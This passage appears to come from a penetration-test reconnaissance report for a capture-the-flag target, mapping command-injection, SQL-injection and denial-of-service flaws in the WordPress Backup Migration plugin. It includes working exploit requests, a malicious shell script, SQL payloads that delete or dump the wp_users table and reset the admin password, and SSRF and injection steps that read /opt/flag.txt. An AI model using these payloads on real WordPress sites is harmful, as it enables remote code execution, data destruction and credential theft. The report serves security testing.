**HIGH #4: PHP CLI Path Injection**

**Entry Point:** `$_POST['php_cli_manual_path']` via `/wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options`  
**Data Flow Path:**
```
1. /wordpress/wp-content/plugins/backup-backup/includes/ajax.php:1867
   - $this->post['php_cli_manual_path'] assigned
   
2. Line 1867 - Minimal sanitization:
   if (strlen(trim($this->post['php_cli_manual_path'])) > 0) {
       Dashboard\bmi_set_config('OTHER:PHP:CLI', trim($this->post['php_cli_manual_path']));
   }
   
3. Stored as BMI_CLI_EXECUTABLE constant

4. Lines 638, 640, 1145, 1513 - Used in ALL exec() calls:
   @exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" ...');
```

**Sanitization Applied:**
- `trim()` only - removes whitespace
- **NO path validation, NO executable verification**

**Validation Applied:** NONE

**Dangerous Sink:** All exec() calls (lines 638, 640, 1145, 1513)  
**File:** `/wordpress/wp-content/plugins/backup-backup/includes/ajax.php`

**Exploitability:** **HIGH**
- User controls the executable path completely
- Can point to malicious script
- Two-step exploitation:
  1. Set php_cli_manual_path to attacker-controlled script
  2. Trigger any backup/restore operation
  3. Attacker script executes with full PHP context

**Exploit Example:**
```bash
# Step 1: Set malicious PHP path
POST /wp-admin/admin-ajax.php
action=backup_migration&token=bmi&f=save-other-options&php_cli_manual_path=/tmp/evil.sh&nonce=[nonce]

# Step 2: Trigger backup (executes /tmp/evil.sh)
POST /wp-admin/admin-ajax.php
action=backup_migration&token=bmi&f=create-backup&nonce=[nonce]

# /tmp/evil.sh contents:
#!/bin/bash
cat /opt/flag.txt > /tmp/pwned
# Rest of execution continues...
```

---

### SQL Injection Sources

**CRITICAL #5: Table Name SQL Injection in Search & Replace**

**Entry Point:** Backup file table names (attacker-controlled via malicious backup upload)  
**Data Flow Path:**
```
1. /wordpress/wp-content/plugins/backup-backup/includes/database/even-better-restore-v4.php:247
   - $realTableName = explode('`', $objFile->current())[1]
   - Table name extracted from SQL dump line via explode (NO validation)

2. Line 250 - Temporary table name similarly extracted:
   - $tmpTableName = explode('`', $objFile->current())[1]

3. Line 270 - Stored in table map:
   - addNewTableToMap($tmpTableName, $realTableName)

4. Line 340 - Retrieved for search/replace:
   - $allTables = array_keys($this->map['tables'])

5. Line 355 - Passed to BMISearchReplace:
   - new BMISearchReplace([$currentTable], ...)

6. /wordpress/wp-content/plugins/backup-backup/includes/database/search-replace.php:91
   - foreach($tables as $table)

7. Line 96 - DIRECT SQL INJECTION (no escaping):
   - $fields = $wpdb->get_results('DESCRIBE ' . $table);
```

**Sanitization Applied:** NONE - Direct explode extraction

**Validation Applied:** NONE - No regex, no whitelist

**Dangerous Sinks:**
- Line 96: `'DESCRIBE ' . $table`
- Line 128: `'SELECT COUNT(*) AS num FROM \`' . $table . '\`'`
- Line 151: `sprintf('SELECT * FROM %s%s LIMIT %d, %d', $table, ...)`
- Line 183: `'UPDATE ' . $table . ' SET ' . ...`

**File:** `/wordpress/wp-content/plugins/backup-backup/includes/database/search-replace.php`

**Exploitability:** **CRITICAL**
- Complete control over table names via backup file
- Multiple injection points
- Can execute arbitrary SQL statements

**Exploit Example:**
```sql
-- Malicious backup file (backup.sql):
CREATE TABLE IF NOT EXISTS `wp_posts`; DROP TABLE wp_users; --` (
    id INT PRIMARY KEY
);

-- When processed at line 96:
DESCRIBE wp_posts`; DROP TABLE wp_users; --

-- Execution:
-- 1. DESCRIBE wp_posts` (syntax error or succeeds)
-- 2. DROP TABLE wp_users (user table deleted!)
-- 3. -- (comment, rest ignored)
```

**Advanced Exploitation:**
```sql
-- Data exfiltration:
CREATE TABLE IF NOT EXISTS `wp_posts` UNION SELECT user_login, user_pass FROM wp_users INTO OUTFILE '/tmp/stolen.txt'; --` ...

-- Privilege escalation:
CREATE TABLE IF NOT EXISTS `wp_posts`; UPDATE wp_users SET user_pass='$P$BKNOWNHASH' WHERE user_login='admin'; --` ...

-- Blind SQL injection via timing:
CREATE TABLE IF NOT EXISTS `wp_posts`; SELECT IF(SUBSTRING(user_pass,1,1)='$', SLEEP(5), 0) FROM wp_users WHERE user_login='admin'; --` ...
```

---

**CRITICAL #6: Table Name SQL Injection in ALTER/DROP Operations**

**Entry Point:** Same as #5 (backup file table names)  
**Data Flow Path:**
```
1. Same extraction as #5 (lines 247, 250 in even-better-restore-v4.php)

2. Line 296 - Table rename loop:
   - foreach ($tables as $oldTable => $newTable)

3. Lines 298, 301 - DIRECT INJECTION:
   - $sql = "DROP TABLE IF EXISTS `" . $newTable . "`;";
   - $sql = "ALTER TABLE `" . $oldTable . "` RENAME TO `" . $newTable . "`;";

4. Line 168 - DROP TABLE injection:
   - $wpdb->query("DROP TABLE IF EXISTS `" . $tableName . "`;");
```

**Sanitization Applied:** NONE

**Validation Applied:** NONE

**Dangerous Sinks:**
- Line 168: `"DROP TABLE IF EXISTS \`" . $tableName . "\`;"`
- Line 298: `"DROP TABLE IF EXISTS \`" . $newTable . "\`;"`
- Line 301: `"ALTER TABLE \`" . $oldTable . "\` RENAME TO \`" . $newTable . "\`;"`

**File:** `/wordpress/wp-content/plugins/backup-backup/includes/database/even-better-restore-v4.php`

**Exploitability:** **CRITICAL**
- Backticks provide some protection but can be bypassed
- If table name contains backtick: `` `table`; DELETE FROM wp_users; -- ``

**Exploit Example:**
```sql
-- Malicious table name: wp_posts`; DELETE FROM wp_users WHERE 1=1; --
-- Results in: DROP TABLE IF EXISTS `wp_posts`; DELETE FROM wp_users WHERE 1=1; --`;

-- Execution:
-- 1. DROP TABLE IF EXISTS `wp_posts`
-- 2. DELETE FROM wp_users WHERE 1=1
-- 3. --` (commented)
```

---

**MEDIUM #7: Search/Replace LIKE Pattern DoS**

**Entry Point:** Backup manifest domain/path values  
**Data Flow Path:**
```
1. /wordpress/wp-content/plugins/backup-backup/includes/database/even-better-restore-v4.php:329
   - $backupRootDir = $this->manifest->config->ABSPATH (from backup JSON)

2. Line 336 - Domain from manifest:
   - $backupDomain = $this->manifest->dbdomain

3. Line 396 - Passed to search/replace:
   - $replaceEngine->perform($backupRootDir, $currentRootDir)

4. /wordpress/wp-content/plugins/backup-backup/includes/database/search-replace.php:119-120
   - WHERE clause construction with LIKE:
   $whereStmt .= '(`' . $column . '`' . ' LIKE ' . '"%' . mysqli_real_escape_string($wpdb->dbh, $search) . '%"';
```

**Sanitization Applied:**
- `mysqli_real_escape_string()` - Escapes quotes, slashes

**Validation Applied:** NONE on LIKE wildcards

**Dangerous Sink:** Lines 119-120  
**File:** `/wordpress/wp-content/plugins/backup-backup/includes/database/search-replace.php`

**Exploitability:** **MEDIUM**
- `mysqli_real_escape_string()` prevents SQL injection
- However, LIKE wildcards (%) are NOT escaped
- Can cause denial of service with catastrophic backtracking

**Exploit Example:**
```json
// Malicious manifest.json:
{
  "dbdomain": "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%",
  "config": {
    "ABSPATH": "/var/www/html/"
  }
}

// Results in WHERE clause:
// WHERE `column` LIKE "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
// Extremely inefficient pattern matching, CPU exhaustion
```

---

### Summary Table

| ID | Type | Location | Entry Point | Sanitization | Validation | Exploitability | Impact |
|----|------|----------|-------------|--------------|------------|----------------|--------|
| #1 | Command Injection | ajax.php:1513 | `$_POST['url']` | sanitize_text_field() | NONE | **CRITICAL** | RCE, flag exfiltration |
| #2 | Command Injection | ajax.php:1145 | `$_POST['file']` | sanitize_text_field() | NONE | **CRITICAL** | RCE, flag exfiltration |
| #3 | Command Injection | ajax.php:638,640 | Backup name config | Strong (if via config) | Strong (config validation) | **MEDIUM** | RCE (if validation bypassed) |
| #4 | Command Injection | ajax.php:all exec() | `$_POST['php_cli_manual_path']` | trim() | NONE | **HIGH** | RCE via malicious script path |
| #5 | SQL Injection | search-replace.php:96+ | Backup table names | NONE | NONE | **CRITICAL** | DB compromise, data exfiltration |
| #6 | SQL Injection | even-better-restore-v4.php:168,298,301 | Backup table names | NONE | NONE | **CRITICAL** | DB structure manipulation |
| #7 | SQL DoS | search-replace.php:119-120 | Backup manifest domain | mysqli_real_escape_string() | NONE (wildcards) | **MEDIUM** | Denial of service |

**Authentication Context:** ALL vulnerabilities require authenticated WordPress user with access to `/wp-admin/` area (any role due to `is_admin()` flaw).

**Network Accessibility:** ✅ All sources accessible via `/wp-admin/admin-ajax.php` endpoint on port 45513.

---

## Conclusion

This reconnaissance deliverable provides a comprehensive map of the WordPress 6.5.4 application's attack surface. The most critical findings are:

1. **3 Command Injection Vulnerabilities** - Direct RCE paths via URL, filename, and PHP CLI path parameters
2. **3 SQL Injection Vulnerabilities** - Database compromise via table name injection during restoration
3. **6 Authorization Bypass Vulnerabilities** - Including predictable auto-login and config-based authentication bypasses
4. **Broken Authorization Model** - `is_admin()` misuse allows any authenticated user to perform administrative operations
5. **Multiple IDOR Vulnerabilities** - No object ownership tracking for backups, logs, or operations

**Primary Attack Path to CTF Flag:**
```
1. Authenticate as any user (even subscriber)
2. Navigate to /wp-admin/ to satisfy is_admin() check
3. Exploit SSRF with file:// protocol:
   POST /wp-admin/admin-ajax.php
   action=backup_migration&f=download-backup&url=file:///opt/flag.txt&token=bmi&nonce=[valid]
4. Backup file downloaded with flag contents
```

**Alternative Path (Command Injection):**
```
1. Same authentication
2. Inject command:
   url=http://test";cat /opt/flag.txt > /tmp/flag.txt;"
3. Read /tmp/flag.txt via backup download or subsequent operations
```

All subsequent vulnerability analysis phases (Injection, XSS, Auth, Authz, SSRF) should prioritize the Backup Migration plugin endpoints documented in this report.